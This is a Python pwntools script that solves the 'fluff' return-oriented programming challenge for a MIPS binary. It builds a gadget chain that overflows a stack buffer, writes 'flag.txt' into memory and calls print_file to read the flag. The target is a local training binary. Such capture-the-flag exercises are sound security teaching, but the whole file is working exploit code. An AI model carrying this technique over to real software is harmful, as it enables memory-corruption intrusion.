from pwn import *

elf = ELF("fluff_mipsel")

context.binary = elf
context.terminal = ['konsole', '-e']
context.log_level = logging.INFO

gdbscript = '''
set follow-fork-mode parent
break *pwnme+0x134
continue
'''

def connection():
    if args.GDB:
        c = gdb.debug([elf.path], gdbscript=gdbscript)
    else:
        c = process([elf.path])
    return c

BUFFER_SIZE = 32
READ_SIZE = 512

MEMORY = elf.bss(0x800)
PATH = b'flag.txt'

# there are many more useful gadgets in the binary, but we'll stick to the intended ones
RESET_S1_GADGET = elf.symbols.questionableGadgets
LOAD_S2_GADGET = elf.symbols.questionableGadgets + 0x1c
XOR_S1_S2_GADGET = elf.symbols.questionableGadgets + 0x34
SWAP_S0_S1_GADGET = elf.symbols.questionableGadgets + 0x4c
STORE_S1_S0_GADGET = elf.symbols.questionableGadgets + 0x6c
CALL_GADGET = elf.symbols.questionableGadgets + 0x7c

def store(address, value):
    return flat \
    (
        # $s0 = address
        [RESET_S1_GADGET, 0, 0],
        [LOAD_S2_GADGET, 0, address],
        [XOR_S1_S2_GADGET, 0],
        [SWAP_S0_S1_GADGET, 0],
        # $s1 = value
        [RESET_S1_GADGET, 0, 0],
        [LOAD_S2_GADGET, 0, value[:context.bytes]], # sanity
        [XOR_S1_S2_GADGET, 0],
        # [$s0] = $s1
        [STORE_S1_S0_GADGET, 0],
    )

def main():
    rop = ROP(elf)
    rop.raw(rop.generatePadding(0, BUFFER_SIZE + context.bytes))
    # write path in 2 halves to memory
    rop.raw(store(MEMORY, PATH[:context.bytes]))
    rop.raw(store(MEMORY + context.bytes, PATH[context.bytes:]))
    # call print_file with path as argument
    rop.raw([CALL_GADGET, 0, elf.plt.print_file, MEMORY])
    payload = rop.chain()
    assert len(payload) <= READ_SIZE
    
    c = connection()
    c.sendafter(b'> ', payload)
    print(c.recvregex(rb'ROPE{.*}', capture=True).group().strip().decode())

if __name__ == '__main__':
    main()
